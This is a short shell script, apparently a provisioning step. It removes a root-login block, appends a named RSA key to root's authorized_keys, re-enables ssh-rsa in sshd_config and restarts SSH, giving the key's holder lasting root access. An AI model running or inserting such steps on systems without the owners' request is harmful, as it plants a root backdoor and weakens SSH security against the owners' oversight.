mkdir -p /root/.ssh/;
sed -e "s/echo;sleep 10;exit 142//g" -i /root/.ssh/authorized_keys;
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCo/jfPmFrE90NgXBSTvbk3n+M/84uR0Algo9k0MyqhJGjV+Dbt1/jz+b/49aGnf/ZzvXTtDni++oaCJqm9iR3eO/rmnEZIuiK2zc2ABTICADm0MrH74sTZNL4o6qFhRnZb0RldXDUxyExF6OEOClH8T2WgSl8ZG2I6DnTo1rK1AqSfLHdWapMg72it3Q4OPAgmHS6N+gy+WL5OY923+mG81sbPH6UHiaS1LHb3GnCLtjXegL/87W1pLceYWZN0cNCxyyiWaftVzla+Bx1ThwMGJY8QpJQpX8DfEaigWQoHm5Zli7b8RdFD3aB04Zr5/9o4p7pViN54iqWX5POm0HUP aiv-saas-20240427" >> /root/.ssh/authorized_keys;
echo "PubkeyAcceptedKeyTypes=+ssh-rsa" >> /etc/ssh/sshd_config;
service ssh restart;
